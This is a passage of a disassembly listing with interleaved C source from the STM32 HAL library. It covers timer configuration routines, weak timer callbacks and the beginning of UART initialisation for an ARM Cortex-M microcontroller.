  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 80051f0:	b480      	push	{r7}
 80051f2:	b085      	sub	sp, #20
 80051f4:	af00      	add	r7, sp, #0
 80051f6:	6078      	str	r0, [r7, #4]
 80051f8:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 80051fa:	687b      	ldr	r3, [r7, #4]
 80051fc:	681b      	ldr	r3, [r3, #0]
 80051fe:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 8005200:	687b      	ldr	r3, [r7, #4]
 8005202:	4a2a      	ldr	r2, [pc, #168]	; (80052ac <TIM_Base_SetConfig+0xbc>)
 8005204:	4293      	cmp	r3, r2
 8005206:	d003      	beq.n	8005210 <TIM_Base_SetConfig+0x20>
 8005208:	687b      	ldr	r3, [r7, #4]
 800520a:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 800520e:	d108      	bne.n	8005222 <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 8005210:	68fb      	ldr	r3, [r7, #12]
 8005212:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005216:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 8005218:	683b      	ldr	r3, [r7, #0]
 800521a:	685b      	ldr	r3, [r3, #4]
 800521c:	68fa      	ldr	r2, [r7, #12]
 800521e:	4313      	orrs	r3, r2
 8005220:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 8005222:	687b      	ldr	r3, [r7, #4]
 8005224:	4a21      	ldr	r2, [pc, #132]	; (80052ac <TIM_Base_SetConfig+0xbc>)
 8005226:	4293      	cmp	r3, r2
 8005228:	d00b      	beq.n	8005242 <TIM_Base_SetConfig+0x52>
 800522a:	687b      	ldr	r3, [r7, #4]
 800522c:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005230:	d007      	beq.n	8005242 <TIM_Base_SetConfig+0x52>
 8005232:	687b      	ldr	r3, [r7, #4]
 8005234:	4a1e      	ldr	r2, [pc, #120]	; (80052b0 <TIM_Base_SetConfig+0xc0>)
 8005236:	4293      	cmp	r3, r2
 8005238:	d003      	beq.n	8005242 <TIM_Base_SetConfig+0x52>
 800523a:	687b      	ldr	r3, [r7, #4]
 800523c:	4a1d      	ldr	r2, [pc, #116]	; (80052b4 <TIM_Base_SetConfig+0xc4>)
 800523e:	4293      	cmp	r3, r2
 8005240:	d108      	bne.n	8005254 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 8005242:	68fb      	ldr	r3, [r7, #12]
 8005244:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8005248:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 800524a:	683b      	ldr	r3, [r7, #0]
 800524c:	68db      	ldr	r3, [r3, #12]
 800524e:	68fa      	ldr	r2, [r7, #12]
 8005250:	4313      	orrs	r3, r2
 8005252:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 8005254:	68fb      	ldr	r3, [r7, #12]
 8005256:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 800525a:	683b      	ldr	r3, [r7, #0]
 800525c:	695b      	ldr	r3, [r3, #20]
 800525e:	4313      	orrs	r3, r2
 8005260:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 8005262:	687b      	ldr	r3, [r7, #4]
 8005264:	68fa      	ldr	r2, [r7, #12]
 8005266:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 8005268:	683b      	ldr	r3, [r7, #0]
 800526a:	689a      	ldr	r2, [r3, #8]
 800526c:	687b      	ldr	r3, [r7, #4]
 800526e:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 8005270:	683b      	ldr	r3, [r7, #0]
 8005272:	681a      	ldr	r2, [r3, #0]
 8005274:	687b      	ldr	r3, [r7, #4]
 8005276:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 8005278:	687b      	ldr	r3, [r7, #4]
 800527a:	4a0c      	ldr	r2, [pc, #48]	; (80052ac <TIM_Base_SetConfig+0xbc>)
 800527c:	4293      	cmp	r3, r2
 800527e:	d007      	beq.n	8005290 <TIM_Base_SetConfig+0xa0>
 8005280:	687b      	ldr	r3, [r7, #4]
 8005282:	4a0b      	ldr	r2, [pc, #44]	; (80052b0 <TIM_Base_SetConfig+0xc0>)
 8005284:	4293      	cmp	r3, r2
 8005286:	d003      	beq.n	8005290 <TIM_Base_SetConfig+0xa0>
 8005288:	687b      	ldr	r3, [r7, #4]
 800528a:	4a0a      	ldr	r2, [pc, #40]	; (80052b4 <TIM_Base_SetConfig+0xc4>)
 800528c:	4293      	cmp	r3, r2
 800528e:	d103      	bne.n	8005298 <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 8005290:	683b      	ldr	r3, [r7, #0]
 8005292:	691a      	ldr	r2, [r3, #16]
 8005294:	687b      	ldr	r3, [r7, #4]
 8005296:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 8005298:	687b      	ldr	r3, [r7, #4]
 800529a:	2201      	movs	r2, #1
 800529c:	615a      	str	r2, [r3, #20]
}
 800529e:	bf00      	nop
 80052a0:	3714      	adds	r7, #20
 80052a2:	46bd      	mov	sp, r7
 80052a4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80052a8:	4770      	bx	lr
 80052aa:	bf00      	nop
 80052ac:	40012c00 	.word	0x40012c00
 80052b0:	40014000 	.word	0x40014000
 80052b4:	40014400 	.word	0x40014400

080052b8 <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 80052b8:	b480      	push	{r7}
 80052ba:	b087      	sub	sp, #28
 80052bc:	af00      	add	r7, sp, #0
 80052be:	60f8      	str	r0, [r7, #12]
 80052c0:	60b9      	str	r1, [r7, #8]
 80052c2:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 80052c4:	68fb      	ldr	r3, [r7, #12]
 80052c6:	6a1b      	ldr	r3, [r3, #32]
 80052c8:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 80052ca:	68fb      	ldr	r3, [r7, #12]
 80052cc:	6a1b      	ldr	r3, [r3, #32]
 80052ce:	f023 0201 	bic.w	r2, r3, #1
 80052d2:	68fb      	ldr	r3, [r7, #12]
 80052d4:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80052d6:	68fb      	ldr	r3, [r7, #12]
 80052d8:	699b      	ldr	r3, [r3, #24]
 80052da:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 80052dc:	693b      	ldr	r3, [r7, #16]
 80052de:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 80052e2:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 80052e4:	687b      	ldr	r3, [r7, #4]
 80052e6:	011b      	lsls	r3, r3, #4
 80052e8:	693a      	ldr	r2, [r7, #16]
 80052ea:	4313      	orrs	r3, r2
 80052ec:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 80052ee:	697b      	ldr	r3, [r7, #20]
 80052f0:	f023 030a 	bic.w	r3, r3, #10
 80052f4:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 80052f6:	697a      	ldr	r2, [r7, #20]
 80052f8:	68bb      	ldr	r3, [r7, #8]
 80052fa:	4313      	orrs	r3, r2
 80052fc:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 80052fe:	68fb      	ldr	r3, [r7, #12]
 8005300:	693a      	ldr	r2, [r7, #16]
 8005302:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005304:	68fb      	ldr	r3, [r7, #12]
 8005306:	697a      	ldr	r2, [r7, #20]
 8005308:	621a      	str	r2, [r3, #32]
}
 800530a:	bf00      	nop
 800530c:	371c      	adds	r7, #28
 800530e:	46bd      	mov	sp, r7
 8005310:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005314:	4770      	bx	lr

08005316 <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 8005316:	b480      	push	{r7}
 8005318:	b087      	sub	sp, #28
 800531a:	af00      	add	r7, sp, #0
 800531c:	60f8      	str	r0, [r7, #12]
 800531e:	60b9      	str	r1, [r7, #8]
 8005320:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 8005322:	68fb      	ldr	r3, [r7, #12]
 8005324:	6a1b      	ldr	r3, [r3, #32]
 8005326:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 8005328:	68fb      	ldr	r3, [r7, #12]
 800532a:	6a1b      	ldr	r3, [r3, #32]
 800532c:	f023 0210 	bic.w	r2, r3, #16
 8005330:	68fb      	ldr	r3, [r7, #12]
 8005332:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 8005334:	68fb      	ldr	r3, [r7, #12]
 8005336:	699b      	ldr	r3, [r3, #24]
 8005338:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 800533a:	693b      	ldr	r3, [r7, #16]
 800533c:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 8005340:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 8005342:	687b      	ldr	r3, [r7, #4]
 8005344:	031b      	lsls	r3, r3, #12
 8005346:	693a      	ldr	r2, [r7, #16]
 8005348:	4313      	orrs	r3, r2
 800534a:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 800534c:	697b      	ldr	r3, [r7, #20]
 800534e:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 8005352:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 8005354:	68bb      	ldr	r3, [r7, #8]
 8005356:	011b      	lsls	r3, r3, #4
 8005358:	697a      	ldr	r2, [r7, #20]
 800535a:	4313      	orrs	r3, r2
 800535c:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 800535e:	68fb      	ldr	r3, [r7, #12]
 8005360:	693a      	ldr	r2, [r7, #16]
 8005362:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005364:	68fb      	ldr	r3, [r7, #12]
 8005366:	697a      	ldr	r2, [r7, #20]
 8005368:	621a      	str	r2, [r3, #32]
}
 800536a:	bf00      	nop
 800536c:	371c      	adds	r7, #28
 800536e:	46bd      	mov	sp, r7
 8005370:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005374:	4770      	bx	lr

08005376 <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 8005376:	b480      	push	{r7}
 8005378:	b085      	sub	sp, #20
 800537a:	af00      	add	r7, sp, #0
 800537c:	6078      	str	r0, [r7, #4]
 800537e:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 8005380:	687b      	ldr	r3, [r7, #4]
 8005382:	689b      	ldr	r3, [r3, #8]
 8005384:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 8005386:	68fb      	ldr	r3, [r7, #12]
 8005388:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800538c:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 800538e:	683a      	ldr	r2, [r7, #0]
 8005390:	68fb      	ldr	r3, [r7, #12]
 8005392:	4313      	orrs	r3, r2
 8005394:	f043 0307 	orr.w	r3, r3, #7
 8005398:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800539a:	687b      	ldr	r3, [r7, #4]
 800539c:	68fa      	ldr	r2, [r7, #12]
 800539e:	609a      	str	r2, [r3, #8]
}
 80053a0:	bf00      	nop
 80053a2:	3714      	adds	r7, #20
 80053a4:	46bd      	mov	sp, r7
 80053a6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053aa:	4770      	bx	lr

080053ac <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 80053ac:	b480      	push	{r7}
 80053ae:	b087      	sub	sp, #28
 80053b0:	af00      	add	r7, sp, #0
 80053b2:	60f8      	str	r0, [r7, #12]
 80053b4:	60b9      	str	r1, [r7, #8]
 80053b6:	607a      	str	r2, [r7, #4]
 80053b8:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 80053ba:	68fb      	ldr	r3, [r7, #12]
 80053bc:	689b      	ldr	r3, [r3, #8]
 80053be:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 80053c0:	697b      	ldr	r3, [r7, #20]
 80053c2:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 80053c6:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 80053c8:	683b      	ldr	r3, [r7, #0]
 80053ca:	021a      	lsls	r2, r3, #8
 80053cc:	687b      	ldr	r3, [r7, #4]
 80053ce:	431a      	orrs	r2, r3
 80053d0:	68bb      	ldr	r3, [r7, #8]
 80053d2:	4313      	orrs	r3, r2
 80053d4:	697a      	ldr	r2, [r7, #20]
 80053d6:	4313      	orrs	r3, r2
 80053d8:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 80053da:	68fb      	ldr	r3, [r7, #12]
 80053dc:	697a      	ldr	r2, [r7, #20]
 80053de:	609a      	str	r2, [r3, #8]
}
 80053e0:	bf00      	nop
 80053e2:	371c      	adds	r7, #28
 80053e4:	46bd      	mov	sp, r7
 80053e6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053ea:	4770      	bx	lr

080053ec <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 80053ec:	b480      	push	{r7}
 80053ee:	b085      	sub	sp, #20
 80053f0:	af00      	add	r7, sp, #0
 80053f2:	6078      	str	r0, [r7, #4]
 80053f4:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 80053f6:	687b      	ldr	r3, [r7, #4]
 80053f8:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 80053fc:	2b01      	cmp	r3, #1
 80053fe:	d101      	bne.n	8005404 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 8005400:	2302      	movs	r3, #2
 8005402:	e04f      	b.n	80054a4 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 8005404:	687b      	ldr	r3, [r7, #4]
 8005406:	2201      	movs	r2, #1
 8005408:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 800540c:	687b      	ldr	r3, [r7, #4]
 800540e:	2202      	movs	r2, #2
 8005410:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 8005414:	687b      	ldr	r3, [r7, #4]
 8005416:	681b      	ldr	r3, [r3, #0]
 8005418:	685b      	ldr	r3, [r3, #4]
 800541a:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 800541c:	687b      	ldr	r3, [r7, #4]
 800541e:	681b      	ldr	r3, [r3, #0]
 8005420:	689b      	ldr	r3, [r3, #8]
 8005422:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 8005424:	687b      	ldr	r3, [r7, #4]
 8005426:	681b      	ldr	r3, [r3, #0]
 8005428:	4a21      	ldr	r2, [pc, #132]	; (80054b0 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 800542a:	4293      	cmp	r3, r2
 800542c:	d108      	bne.n	8005440 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 800542e:	68fb      	ldr	r3, [r7, #12]
 8005430:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 8005434:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 8005436:	683b      	ldr	r3, [r7, #0]
 8005438:	685b      	ldr	r3, [r3, #4]
 800543a:	68fa      	ldr	r2, [r7, #12]
 800543c:	4313      	orrs	r3, r2
 800543e:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 8005440:	68fb      	ldr	r3, [r7, #12]
 8005442:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005446:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 8005448:	683b      	ldr	r3, [r7, #0]
 800544a:	681b      	ldr	r3, [r3, #0]
 800544c:	68fa      	ldr	r2, [r7, #12]
 800544e:	4313      	orrs	r3, r2
 8005450:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 8005452:	687b      	ldr	r3, [r7, #4]
 8005454:	681b      	ldr	r3, [r3, #0]
 8005456:	68fa      	ldr	r2, [r7, #12]
 8005458:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 800545a:	687b      	ldr	r3, [r7, #4]
 800545c:	681b      	ldr	r3, [r3, #0]
 800545e:	4a14      	ldr	r2, [pc, #80]	; (80054b0 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 8005460:	4293      	cmp	r3, r2
 8005462:	d009      	beq.n	8005478 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005464:	687b      	ldr	r3, [r7, #4]
 8005466:	681b      	ldr	r3, [r3, #0]
 8005468:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 800546c:	d004      	beq.n	8005478 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 800546e:	687b      	ldr	r3, [r7, #4]
 8005470:	681b      	ldr	r3, [r3, #0]
 8005472:	4a10      	ldr	r2, [pc, #64]	; (80054b4 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 8005474:	4293      	cmp	r3, r2
 8005476:	d10c      	bne.n	8005492 <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 8005478:	68bb      	ldr	r3, [r7, #8]
 800547a:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 800547e:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 8005480:	683b      	ldr	r3, [r7, #0]
 8005482:	689b      	ldr	r3, [r3, #8]
 8005484:	68ba      	ldr	r2, [r7, #8]
 8005486:	4313      	orrs	r3, r2
 8005488:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 800548a:	687b      	ldr	r3, [r7, #4]
 800548c:	681b      	ldr	r3, [r3, #0]
 800548e:	68ba      	ldr	r2, [r7, #8]
 8005490:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 8005492:	687b      	ldr	r3, [r7, #4]
 8005494:	2201      	movs	r2, #1
 8005496:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 800549a:	687b      	ldr	r3, [r7, #4]
 800549c:	2200      	movs	r2, #0
 800549e:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 80054a2:	2300      	movs	r3, #0
}
 80054a4:	4618      	mov	r0, r3
 80054a6:	3714      	adds	r7, #20
 80054a8:	46bd      	mov	sp, r7
 80054aa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054ae:	4770      	bx	lr
 80054b0:	40012c00 	.word	0x40012c00
 80054b4:	40014000 	.word	0x40014000

080054b8 <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 80054b8:	b480      	push	{r7}
 80054ba:	b083      	sub	sp, #12
 80054bc:	af00      	add	r7, sp, #0
 80054be:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 80054c0:	bf00      	nop
 80054c2:	370c      	adds	r7, #12
 80054c4:	46bd      	mov	sp, r7
 80054c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054ca:	4770      	bx	lr

080054cc <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 80054cc:	b480      	push	{r7}
 80054ce:	b083      	sub	sp, #12
 80054d0:	af00      	add	r7, sp, #0
 80054d2:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 80054d4:	bf00      	nop
 80054d6:	370c      	adds	r7, #12
 80054d8:	46bd      	mov	sp, r7
 80054da:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054de:	4770      	bx	lr

080054e0 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 80054e0:	b480      	push	{r7}
 80054e2:	b083      	sub	sp, #12
 80054e4:	af00      	add	r7, sp, #0
 80054e6:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 80054e8:	bf00      	nop
 80054ea:	370c      	adds	r7, #12
 80054ec:	46bd      	mov	sp, r7
 80054ee:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054f2:	4770      	bx	lr

080054f4 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 80054f4:	b580      	push	{r7, lr}
 80054f6:	b082      	sub	sp, #8
 80054f8:	af00      	add	r7, sp, #0
 80054fa:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 80054fc:	687b      	ldr	r3, [r7, #4]
 80054fe:	2b00      	cmp	r3, #0
 8005500:	d101      	bne.n	8005506 <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 8005502:	2301      	movs	r3, #1
 8005504:	e040      	b.n	8005588 <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 8005506:	687b      	ldr	r3, [r7, #4]
 8005508:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 800550a:	2b00      	cmp	r3, #0
 800550c:	d106      	bne.n	800551c <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 800550e:	687b      	ldr	r3, [r7, #4]
 8005510:	2200      	movs	r2, #0
 8005512:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 8005516:	6878      	ldr	r0, [r7, #4]
 8005518:	f7fb fd78 	bl	800100c <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 800551c:	687b      	ldr	r3, [r7, #4]
 800551e:	2224      	movs	r2, #36	; 0x24
 8005520:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 8005522:	687b      	ldr	r3, [r7, #4]
 8005524:	681b      	ldr	r3, [r3, #0]
 8005526:	681a      	ldr	r2, [r3, #0]
 8005528:	687b      	ldr	r3, [r7, #4]
 800552a:	681b      	ldr	r3, [r3, #0]
 800552c:	f022 0201 	bic.w	r2, r2, #1
 8005530:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 8005532:	687b      	ldr	r3, [r7, #4]
 8005534:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005536:	2b00      	cmp	r3, #0
 8005538:	d002      	beq.n	8005540 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 800553a:	6878      	ldr	r0, [r7, #4]
 800553c:	f000 fa54 	bl	80059e8 <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 8005540:	6878      	ldr	r0, [r7, #4]
 8005542:	f000 f825 	bl	8005590 <UART_SetConfig>
 8005546:	4603      	mov	r3, r0
 8005548:	2b01      	cmp	r3, #1
 800554a:	d101      	bne.n	8005550 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 800554c:	2301      	movs	r3, #1
 800554e:	e01b      	b.n	8005588 <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 8005550:	687b      	ldr	r3, [r7, #4]
 8005552:	681b      	ldr	r3, [r3, #0]
 8005554:	685a      	ldr	r2, [r3, #4]
 8005556:	687b      	ldr	r3, [r7, #4]
 8005558:	681b      	ldr	r3, [r3, #0]
 800555a:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 800555e:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 8005560:	687b      	ldr	r3, [r7, #4]
